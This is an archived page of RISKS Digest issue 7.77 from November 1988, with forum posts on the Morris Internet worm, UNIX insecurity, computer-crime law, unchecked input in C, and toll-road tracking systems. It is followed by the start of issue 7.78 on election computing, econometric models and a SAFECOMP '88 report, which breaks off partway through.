<LINK REL="Prev" HREF="/Risks/7.76.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.78.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.76.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.78.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 77</H1>
<H2> Monday 14 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
WORM/VIRUS:
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  UNIX InSecurity (beyond the Virus-Worm) 
</A>
<DD>
<A HREF="#subj2.1">
Klaus Brunnstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Unauthorized Access 
</A>
<DD>
<A HREF="#subj3.1">
Dennis G. Rears
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  re: NY Computer Laws and the Internet Worm 
</A>
<DD>
<A HREF="#subj4.1">
Forrest Colliver
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: NSA attempts to restrict virus information 
</A>
<DD>
<A HREF="#subj5.1">
Steven Bellovin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Risks of unchecked input in C programs 
</A>
<DD>
<A HREF="#subj6.1">
Bill Stewart
</A><br>
<A HREF="#subj6.2">
 Bob Frankston
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Worms &amp; Ethics 
</A>
<DD>
<A HREF="#subj7.1">
Don Wegeng
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  One count, or multiple counts? 
</A>
<DD>
<A HREF="#subj8.1">
Richard Wiggins
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  The RISKS of jargon 
</A>
<DD>
<A HREF="#subj9.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
OTHER CONTRIBUTIONS:
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  University of Surrey Hacker 
</A>
<DD>
<A HREF="#subj11.1">
Brian Randell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Re: UK vehicle-identification systems 
</A>
<DD>
<A HREF="#subj12.1">
Steven C. Den Beste
</A><br>
<A HREF="#subj12.2">
 Franklin Davis
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
UNIX InSecurity (beyond the Virus-Worm)
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>
11 Nov 88 15:27 GMT+0100
</i><PRE>

Sitting far away from the `center of epidemy' (and not using UNIX), I
observe with great interest the analysis of the `Virus Worm'. In FRG
newsmedia, the New York Times article produced public uproar, with several
newspapers and the magazine `Der SPIEGEL' (in its November 7 edition)
speculating, that something similar might happen to the computers of banks,
tax authorities and state agencies. Moreover, the damage is reported to have
affected `more than 6.000 large computers connected to ARPANET', and
additionally, Joseph Weizenbaum is cited saying that this virus may also
affect the really sensitive military US-installations.

Evidently, a large portion of the newsproducers is infected by the `Virus of
Disinformation'. First lesson to be learned:  the insecurity of relevant
operating systems, well-known to experts since long time, must be
disseminated from specialists to the computer profession. If even Edp people
are not conscious of the risks imbedded in today's operating systems, we
cannot hope for solid public presentation of such events.

In my personal fight against usage of UNIX in processing sensitive data
(such as in medical, economical and public applications), I usually find my
audience deeply surprised when citing F.T.Grampp and R.H.Morris, who in
their AT&amp;T Bell Lab Technical Journal (October 1984) article about UNIX
Operating System Security wrote, after analysing the merits of `open
systems' such as UNIX:

   `Such open systems cannot ever be made secure in any strong
    sense; that is, they are unfit for applications involving
    classified government information, corporate accounting,
    records relating to individual provacy, and the like...'

When I chaired, at the German Unix User Group annual conference in Hannover,
September 1988, the session devoted to UNIX SECURITY, one speaker analysed
that a Secure UNIX would hardly get a higher Orange Book classification than
C2 or B1 because otherwise the restrictions and changes would produce
something very different. A `security shell', as now planned by X/OPEN, is a
contradiction in itself, because effective security must be implemented in
the kernel. Moreover, real security deficiencies are even worse, as `most
UNIX systems are far less secure than they can and should be', as
Grampp/Morris wrote in 1984: while the SENDMAIL/DEBUG allows for worm
applications such as network and remote system monitoring, fault analysis
and maintenance, it may be the basis of even really harmful crimoid
applications, such as Trojan Horses, Viruses or automated espionage
programs.

(While Gould hopes to get DoD class B1, sometime early in 1989, for its new
Secure UNIX concept, someone told me that IBM's AIX has been rated B1; can
anybody inform me, whether this is true?)

Despite of such insight (even of their employees), several manufacturers try
hard to sell UNIX systems to banks, medical institutions and state agencies,
in conscious contradiction to Grampp/Morris insight. While specially
protected `production systems' are neither available nor developped, the
installation, first isolated but later integrated into complex systems, of
such inherently insecure systems will inevitably produce a `big bang' in
some not to distant future: the criminal potential is deeply embedded in the
systems, more than in their abuse.

While the Virus-Worm did evidently produce only limited damage (esp.
`eating' time and intelligence during a 16-hour nightshift, and further
distracting activities in follow-up discussions, but at the same time
teaching some valuable lessons), the consequence of the UNIX euphoria may
damage enterprises and economies. To me as an educated physicist, parallels
show up to the discussions of the risks overseen by the community of nuclear
physicist. In such a sense, I slightly revise Peter Neumann's analogy to the
Three-Mile-Island and Chernobyl accidents: the advent of the Virus-Worm may
be comparable to a mini Three-Mile Island accident (with large threat though
limited damage), but the `Chernobyl of Computing' is being programmed in
economic applications if ill-advised customers follow the computer industry
into insecure UNIX-land.

Klaus Brunnstein     University of Hamburg     FRG

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Unauthorized Access
</A>
</H3>
<address>
"Dennis G. Rears (FSAC)" 
&lt;<A HREF="mailto:drears@ARDEC.ARPA">
drears@ARDEC.ARPA
</A>&gt;
</address>
<i>
Sat, 12 Nov 88 13:37:18 EST
</i><PRE>

Dave Bozak writes:

&gt;	Clearly the design and release of a worm is a violation of
&gt;section 156.10.  The worm was released was intended to gain access to
&gt;machines without authorization and was designed to gain access to
&gt;material (host lists) for propagation of the worm.
&gt;	Now maybe I am missing something here, not being a lawyer...so
&gt;would learned colleagues please clarify the legal issues involved
&gt;in this particular case?

   The key is "unauthorized access".  The sendmail process from the target
machine allowed him to access it.  He did not access that process without
authorization; he just gave it something it didn't want.  Sendmail accepted it.
Because of that, he did not brake that law.
  The main problem with making worms/viruses illegal is drafting the laws.
What is authorized access?  If a friend of mine on Computer "A" gives me his
password; does that in itself give me authorized access?  Since I am on the
milnet I can fing, ftp anonymously, send mail to lots of computers.  All of
these actions I have implied authorization.  When dealing with networks the
laws have to prohibit actions once access is made not prohibit access.
  
Dennis G. Rears: Computer Scientist, 1LT USAR &amp; Civil Servant
AT&amp;T:	201-724-6639      SMCAR-FSS-E, Bldg 94, Picatinny Ars, NJ 07806

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
re: NY Computer Laws and the Internet Worm
</A>
</H3>
<address>
Forrest Colliver 
&lt;<A HREF="mailto:fwc@mitre.arpa">
fwc@mitre.arpa
</A>&gt;
</address>
<i>
Sat, 12 Nov 88 16:55:11 EST
</i><PRE>

With respect to the apparently "obvious" breaking of laws in the Internet worm
case, bear in mind that the FBI only has jurisdiction in cases which involve
federal crimes, or in cases where a suspect crosses state lines in conjunction
with unlawful activities which would otherwise fall into state or local
jurisdiction.  Thus, breaking of NY state laws would not automatically allow
the FBI to begin an investigation.  It does seem that the progress of the worm
across state boundaries would allow the FBI to assume federal jurisdiction, but
I suspect that without precedents to fall back on, the legal profession is
proceeding with caution!

F.C., The MITRE Corp., Washington, D.C.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: NSA attempts to restrict virus information
</A>
</H3>
<address>
smb@research.att.com 
&lt;<A HREF="mailto:Steven Bellovin">
Steven Bellovin
</A>&gt;
</address>
<i>
Sat, 12 Nov 88 22:49:54 EST
</i><PRE>

The situation is rather worse than the Times and AP have reported.  The NSA is
exerting a great deal of pressure to have disassembler output from the virus
(to say nothing of C source) available to as few people as possible.  When they
learn of a copy in a repository (say, available for anonymous FTP), they ask
their contact -- perhaps an administrator, perhaps a name they happen to know
at that school to remove it.  If that person hesitates, or expresses a wish to
contact the person who made it available, they immediately contact the
president of the university, who calls the dean, who calls, etc.  As best I can
tell, they have no legal authority to order the removal.  But they are not
hesitating to bring as much pressure to bear as they can, to try to scare folks
into complying.
                            		--Steve Bellovin

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Risks of unchecked input in C programs
</A>
</H3>
<address>
&lt;<A HREF="mailto:wcs@alice.att.com">
wcs@alice.att.com
</A>&gt;
</address>
<i>
Sun, 13 Nov 88 22:31:43 EST
</i><PRE>

In RISKS 7.74 Geoff Collyer wrote about the finger-daemon hole caused by gets's
lack of checking on the size of the input, and called for gets's eradication
("A bug waiting to happen").  While the ancestry of gets is certainly dubious,
scanf() suffers from the same problem as commonly used (do *you* always use
%50s instead of %s?  "man scanf" doesn't).

I've always been dissatisfied with the printf/scanf family - field widths are
hard-coded in the format strings, with no way to parameterize them except
building format strings on the fly, and there's no nice way to read/print
arrays except character strings.  It would be nice to say
	int i, data[NITEMS]; char *string;
	string = emalloc(whatever);
	scanf("%nd %ns", NITEMS, data, whatever-1, string);
and know it would read the correct amount of data into each array,
and to write 	printf("%n10f\n", 4, data);
instead of	printf("%10f%10f%10f%10f\n", data[0], data[1].....);

Bill Stewart ho95c.att.com!wcs       AT&amp;T Bell Labs, Holmdel NJ

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Risks of unchecked input in C programs (<A HREF="/Risks/7.74.html">RISKS-7.74</A>)
</A>
</H3>
<address>
bobf@lotus.UUCP 
&lt;<A HREF="mailto:Bob Frankston">
Bob Frankston
</A>&gt;
</address>
<i>
Mon Nov 14 10:05:25 1988
</i><PRE>

The "little care" necessary to use the string functions safely amounts to
reimplementing them which renders them pointless but they are very dangerous in
that the "not so careful" are so numerous.

</PRE>
<HR><H3><A NAME="subj6.2">
Worms &amp; Ethics
</A>
</H3>
<address>
Don Wegeng 
&lt;<A HREF="mailto:Wegeng.Henr@Xerox.COM">
Wegeng.Henr@Xerox.COM
</A>&gt;
</address>
<i>
14 Nov 88 16:52:23 EST (Monday)
</i><PRE>

In reference to the recent Internet Worm incident, I was going through my
library last night and found that CACM vol. 25, no. 3 (March 1982) contains
two relevant articles. The first is the well known Worm paper by Shoch &amp;
Hupp, immediately followed by "A Self-Assessment Procedure Dealing with
Ethics in Computing," edited by Eric A. Weiss. In light of recent history
this is an interesting coincidence.

Perhaps we should teach Computer Science students to read the entire journal
issue when they're reading papers on a particular topic. :-(
                                                                  /Don

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
One count, or multiple counts?
</A>
</H3>
<address>
&lt;<A HREF="mailto:Richard_Wiggins@um.cc.umich.edu">
Richard_Wiggins@um.cc.umich.edu
</A>&gt;
</address>
<i>
Mon, 14 Nov 88 09:51:32 EST
</i><PRE>

The Federal law that's been mentioned as the likely tool for prosecution of
Morris Jr makes the first transgression a misdemeanor and subsequent ones a
felony.

The question is, did Morris invade hundreds of computers, or did he invade one
network?

As they say, "the network is the system."  And it appears that he fired only
one salvo -- albeit with 3 warheads.
 
-- Rich Wiggins,    Systems Programmer,    Michigan State University

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
The RISKS of jargon
</A>
</H3>
<address>
Dave Horsfall 
&lt;<A HREF="mailto:dave@stcns3.stc.oz.au">
dave@stcns3.stc.oz.au
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 14:17:00 est
</i><PRE>

One of the RISKS in the use of computers is that it engenders a jargon that is
at odds with community acceptance e.g. "ram", "mouse" etc.

Here is an example of such a RISK that is the other way around, taken (without
permission) from the "Backbytes" page in "Computing Australia", Nov 7, 1988:

``Well, it sounded like an opening.

  Some chipocentric people have difficulty accepting that computers
  aren't the centre of the universe (Whoops!  Is IBM reading this?).  Or
  perhaps it's just that the jargon of the public service is enough to
  throw even computer aficionados (masters of their own gobbledegook).
  Whatever, DDP's state-of-the-art Canberra rep thought he had the
  makings of a sale recently.

  Spotting a Dept.  of Arts, Sport, Environment, Tourism and Territories
  [ yes, Australian bureaucracies are like that!  ] advertisement
  inviting tenders for the "supply and installation of a restricted
  keying system", Richard Presser's white-haired boy thought: "We've got
  just the thing, our Rode/PC!"

  This esoteric device delivers dedicated data entry system performance,
  which is to say, it's a keying system.  At least in computing argot.
  That very day he wrote off requesting more details and, of course,
  tender forms.  To his great astonishment, it turned out what the
  department actually wanted was 108 locks for lockers and and other
  equipment at the Fraser (ACT) Primary School.

-- Dave

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
University of Surrey Hacker
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:B.Randell@newcastle.ac.uk">
B.Randell@newcastle.ac.uk
</A>&gt;
</address>
<i>
Thu, 10 Nov 88 19:14:00 GMT
</i><PRE>

There has been a lot of recent publicity in the U.K. about the arrest of a
hacker at the University of Surrey. There were stories about his investigation
by Scotland Yard's Serious Crimes Squad and by the U.S. Secret Service, and
much dicussion about the inadequacy of the law relating to network hacking - as
far as I know he has only been charged with offences relating his unathorised
(physical) entry to the University buildings.

An article in today's Guardian newspaper that is based on an interview with the
individual, one Edward Austin Singh, reveals that his techniques were simply
based on a program which tricked users into unsuspectingly revealing their
passwords. "I wrote a program that utilised a flaw that allowed me to call into
the dial-up node.  You always do it by phoning, never by the network.  The
dial-up node has to have an address as well, so we were calling the address
itself. I called the dial-up node via the network and did it repeatedly until
it connected.  That happened every 30 seconds.  It allowed me to connect the
dial-up node at the same time as a legitimate user at random.  I would then
emulate the system."

He used to run this program at night, and specialised in breaking into Prime
computer systems: "I picked up about 40 passwords and IDs an hour. We were
picking up military stuff like that, as well as commercial and academic", he
claims. This enabled him to get information from more than 250 systems
world-wide, and (he claims) in concert with an underground hackers network, to
"access virtually every single computer system which was networked in the US -
thousands and thousands of them, many of them US Arms manufacturers".

The article states that "Prime Computers have so far declined to comment on his
approach to them or his alleged penetration of their computer systems, until
the American Secret Service completes its enquiries."

Brian Randell

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: UK vehicle-identification systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:denbeste@OAKLAND.BBN.COM">
denbeste@OAKLAND.BBN.COM
</A>&gt;
</address>
<i>
Mon, 14 Nov 88 09:16:05 -0500
</i><PRE>

I find Chaz's description of the new system in Britain for toll-roads very
interesting, to say the least. I have some interesting questions:

1. As I understood it, what we have is a radio handshake between each car and
fixed tranceivers at the entrance and exit from the toll-road, presumably
connected to a computer billing system which mails you a bill each month. What
if you move and don't tell the computer your new address?

2. The idea is that with this mechanism it won't be necessary for the car to
stop or slow down, as we must do here on the Masspike with traditional toll
booths. More interesting is that it will presumably work in heavy traffic at
high speeds. Not only won't it be necessary for the car to slow down, it can't
do so without causing an accident. So if for any reason the handshake fails,
the system has no recourse. Which leads to the interesting speculations:

3. The handshake happens at a certain radio frequency. What happens if the car
happens to carry a low-power RF noise generater at just that frequency?

4. What happens if someone figures out how to get into their car's tranceiver
and change the signature? It doesn't even have to be a valid one because there
isn't any way for the highway to stop the car or log what it is.

5. What happens to cars which have crossed the Channel from France? Here in
Massachusetts we have people who register their cars in New Hampshire to avoid
the property tax (illegal, by the way); will Brits be registering their cars in
Brittany to avoid the highway tolls?

6. Everything screws up. I can see the following scenario: John drives the A13
(or some other typical highway designation - I made this one up based on, sigh,
Monty Python) to work every day. On Friday he gets on it (handshake succeeds)
and drives home and gets off it (handshake fails for some odd reason - a nearby
lightning strike just during the handshake?); Monday morning he gets back on it
to go to work (another lightning strike louses up the handshake - isn't the
weather *terrible* this time of year?) and gets off it near his job (handshake
normal).
   What does the computer see? It sees John getting on Friday evening and not
getting off until Monday morning. John sure must have driven a lot of miles
that weekend - let's bill him big.

7. Just what WILL the computer do with a partial transaction - get on but don't
get off, or vice versa? I can think of many ways this could happen.

8. Since there will be some cars on the highway without tranceivers (French
etc.) then the system can't scream when it sees one. What is to keep someone
from driving an ice-pick through their tranceiver with a hammer, or much more
simply, pulling its fuse or clipping its power lead? Will the British meter
maids start carrying little tranceiver-testers around checking every parked car
to see if its tranceiver will handshake? The mind boggles. (I think that
pulling the fuse is the best answer - that way you can plug it in again just
before the yearly equipment check.)

Frankly, it sounds like the greatest target for hackers since the ARPAnet!

Steven C. Den Beste,   BBN Communications Corp., Cambridge MA
denbeste@bbn.com(ARPA/CSNET/UUCP)    harvard!bbn.com!denbeste(UUCP)

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
UK vehicle-identification systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:fad@Think.COM">
fad@Think.COM
</A>&gt;
</address>
<i>
Mon, 14 Nov 88 14:52:19 EST
</i><PRE>

In his 10 Nov 88 RISKS contribution, Douglas Jones discusses optical and
microwave barcode scanner devices for collecting tolls from cars.  He
states:
  The risk of such sensors as police devices depends to a great extent on how
  easy it is to instrument locations in the roadway without the driver being
  aware of it.

Why not make use of such a system voluntary?  If I had a choice between
lining up to drop coins in a gate vs. driving through a barcode-reading
gate, I'd choose the latter, assuming it meant I wouldn't have to come to a
stop.  But anyone who prefers anonymity could always use the regular toll
gate (where presumably no one is writing down license plate numbers) and
not install the barcode on their vehicle.  The principle seems to me to be
that if you are potentially diminishing someone's privacy, they should have
a choice about it, and the costs and benefits should be made clear.

--Franklin Davis    Thinking Machines Corporation     fad@think.com

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.76.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.78.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-30</DOCNO>
<DOCOLDNO>IA012-000131-B035-140</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.78.html 128.240.150.127 19970217023914 text/html 20884
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:37:35 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 78</TITLE>
<LINK REL="Prev" HREF="/Risks/7.77.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.79.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.77.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.79.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 78</H1>
<H2> Tuesday 15 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computers in Elections 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks in econometric models 
</A>
<DD>
<A HREF="#subj2.1">
Ross Miller
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Report on SAFECOMP '88 [long] 
</A>
<DD>
<A HREF="#subj3.1">
Tim Shimeall
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computers in Elections 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Tue, 15 Nov 1988 11:10:34 PST
</i><PRE>

Readers of the references given in <A HREF="/Risks/7.52.html">RISKS-7.52</A> to 54, and 7.70 to 71 (the New
Yorker article by Ronnie Dugger, and reports by Roy Saltman; Lance Hoffman;
Bob Wilcox and Erik Nilsson; and Howard Strauss and Jon Edwards) know that
at least five past elections have been legally challenged on grounds of
fraud.  In all of these cases, the same company (BRC, formerly CES) provided
the computing services.  The lawsuit in Indiana is still in process.

The latest item on the integrity of computers in elections relates to this
year's Senate race in Florida.  The New York Times (Saturday, 12 Nov 88, page
9) had an article by Andrew Rosenthal on suspicions of fraud arising from the
results.  At the end of the Election Day ballot counting, the Democrat Buddy
Mackay was ahead.  After the absentee ballots were counted, the Republican
Connie Mack was declared the winner by 30,000 votes out of 4 million.  However,
in four counties for which BRC provided the computing services, the number of
votes counted for Senator was 200,000 votes less than the votes for President
(i.e., 20% less), while in other counties and in previous elections the two
vote totals have generally been within 1% of each other.  Remembering that
these computer systems reportedly permit operators to turn off the audit trails
and to change arbitrary memory locations on the fly, it seems natural to wonder
whether anything fishy went on.  I hope that our Florida readers will keep us
informed of any further developments.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Risks in econometric models
</A>
</H3>
<address>
Ross Miller
&lt;<A HREF="mailto:rmmiller@bu-cs.BU.EDU ">
rmmiller@bu-cs.BU.EDU 
</A>&gt;
</address>
<i>
Mon, 14 Nov 88 16:36:19 EST
</i><PRE>

On the front page of the Sunday N.Y. Times, Peter Neumann raises a computer
security related risk that I have not seen discussed before.  At the end of his
piece on describing the potential for viruses spreading, he states, "Do we know
the econometric models of the country are correct, for example?"  As a once and
sometimes econometrician (who does microeconomic rather than macroeconomic
work), I found this question to be one that is worth examining.

The recent defeat of Michael Dukakis was probably caused in part by the
well-publicized fiscal problems of Massachusetts.  Did George Bush introduce a
computer virus into the state's computers?  Probably not.  What happened was
the effective federal tax rate for capital gains went up, causing investors to
rush to take capital gains before the higher rates went into effect,
temporarily inflating capital gains tax revenues at both federal and state
levels.  Because Massachusetts, as well as many other states, considered the
increased tax collections as a normal part of revenue growth, they continued to
project these gains into the future, when the higher tax rates would prevail.
These projections were wrong, and we know what happened.

This risk, however, has nothing to do with viruses, it has to do with the
environment in which econometric models are created and used.  It should be
noted that the econometric modeling industry has been shrinking for several
years--many banks have eliminated their in-house forecasting group and
subscriptions to outside forecasters are down.  The federal government has
slashed the funds available for data collection and forecasting activities.

The real risk from traditional computer-based econometric forecasting comes
from the lack of new money and talent flowing into the field that keeps the
industry from advancing technologically.  (If you don't believe me, call a
venture capitalist and tell him you'd like to start an econometric forecasting
firm.)  Conceptual bugs, such as described above, and programming errors are
problems that are likely to swamp viruses as a source of error.

Should we worry about all this.  No.  First, to the extent the such models are
used, humans are an important part of the loop.  "Fudge factors" are built into
every model and unreasonable projections are not used--the model is rerun with
new fudge factors.  No doubt, just the way programming and conceptual bugs have
been "fudged over," a virus would be, too.  Second, for most business
applications there are much better sources of economic forecasts than large
econometric models, and they are essentially free.  For example, I can safely
state that a reasonable projection of crude oil prices is that they will remain
stable over the next year, decreasing a bit over the winter and going back up
in summer.  Not only that, you can expect long-term interest rates to rise by
about 0.5% over the next two years.  Did I use a Ouija board or consult my
local oracle?  No, I just looked up the futures prices in the Wall Street
Journal.  These are market-generated predictions that are based on the
aggregate information contained by the marketplace.  True, they do not have
pinpoint accuracy, but they tend to perform quite well on average.  As many
companies and banks have concluded, who needs big, expensive econometric
models?  Maybe, just maybe, the marketplace is capable of taking care of some
risks, which in this case has nothing to do with viruses, by itself.
 
Ross Miller          Phone: (617) 868-1135
Boston University    Internet: rmmiller@bu-cs.bu.edu

    [The Times piece consisted of sentences randomly culled from a discursive
    discussion.  The econometric sentence was totally out of context --
    relating to integrity and correctness problems, not just worm/viruses,
    but I'm glad you picked up on it!  Thanks.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Report on SAFECOMP '88 [long]
</A>
</H3>
<address>
Tim Shimeall x2509
&lt;<A HREF="mailto:shimeall@nps-cs.arpa ">
shimeall@nps-cs.arpa 
</A>&gt;
</address>
<i>
Mon, 14 Nov 88 09:50:52 PST
</i><PRE>

                 Report on the IFAC Symposium on
               Safety of Computer Control Systems
                         (SAFECOMP '88)
         Safety Related Computers in an Expanding Market
         November 9-11, 1988 -- Fulda, FRG (West Germany)

This message is a set of personal observations on the Symposium on Safety of
Computer Control Systems, originated and run by the members of EWICS TC-7 with
support from IFAC and IFIPS. Prior to this meeting, SAFECOMP was held every
three years. This meeting was held two years after its predecessor (SAFECOMP
'86 in Sarlat, France) and henceforth is planned to be an annual event
(SAFECOMP '89 will be held in Vienna, Austria on September 5-7, 1989).

EWICS TC-7 (Abstracted from a talk by J. M. A. Rata):

The European Workshop on Industrial Computer Systems is a group originally
started as "Perdue Europe", a series of workshops held in Europe by Purdue
University, it is now sponsored by the European Economic Community.  Almost all
European nations have representatives in EWICS, with the exceptions being
Spain, Portugal and Greece.  The majority of members come from France, the
United Kingdom and West Germany. TC-7 is the Technical Committee on
Reliability, Safety and Security. It's an active group, with a series of
technical reports and "Pre-standard" guidelines on computer safety and
reliability published at frequent intervals. The current Chair of TC-7 is J. M.
A. Rata.

The Workshop:

Over the two and a half days of the symposium, a total of 26 presentations were
made. I'm not going to summarize all of the talks, but will give a description
of those I found most interesting.  The Symposium proceedings are available
from Pergammon Press (Edited by W. D. Ehrenberger, ISBN 0-08-036389), but there
were 6 talks given at the symposium that were not part of the proceedings - 4
of the papers were distributed on site, 1 was a report of work in progress, and
the last was Dr. Rata's description of TC-7. NOTE: the following are summaries
of my notes on the presentations I personally found most interesting.  I
profoundly regret any inaccuracies, and no criticism should be implied on the
papers omitted from this report.  [My personal comments are in square brackets
- TJS]
